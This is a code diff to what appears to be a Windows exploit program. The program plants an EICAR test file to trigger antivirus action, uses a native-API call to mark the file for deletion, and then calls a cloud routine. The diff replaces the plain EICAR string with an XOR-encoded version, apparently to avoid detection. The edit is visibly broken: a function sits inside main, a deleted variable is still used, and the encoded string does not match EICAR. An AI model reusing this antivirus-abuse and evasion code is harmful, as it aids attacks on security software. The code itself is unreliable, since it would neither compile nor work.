@@ -618,10 +618,18 @@ int main()
         printf("Failed create spoof work file.\n");
         return 1;
     }
-    char eicar[] = "*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X";
+// Simple XOR obfuscation example - replace the EICAR write section with this
+std::string getEICAR() {
+    std::string encoded = "Y5P!Q%@BQ[5\\QZY65)Q^)8DD]59}D^G]";  // XORed version of EICAR (example - adjust key)
+    std::string decoded;
+    for (char c : encoded) {
+        decoded += c ^ 0x0F;  // XOR with a simple key (change 0x0F to anything)
+    }
+    return decoded;
+}
     rev(eicar);
     DWORD nwf = 0;
-    WriteFile(hfile, eicar, sizeof(eicar) - 1, &nwf, NULL);
+    WriteFile(hfile, getEICAR(), sizeof(getEICAR()) - 1, &nwf, NULL);
     
     // trigger AV response
     CreateFile(foo, GENERIC_READ | FILE_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -635,7 +643,7 @@ int main()
     FILE_DISPOSITION_INFORMATION_EX fdiex = { 0x00000001 | 0x00000002 };
     _NtSetInformationFile(hfile, &iostat, &fdiex, sizeof(fdiex), (FILE_INFORMATION_CLASS)64);
     CloseHandle(hfile);
-    DoCloudStuff(workdir, filename, sizeof(eicar) - 1);
+    DoCloudStuff(workdir, filename, sizeof(getEICAR()) - 1);
     
     OVERLAPPED ovd = { 0 };
     ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
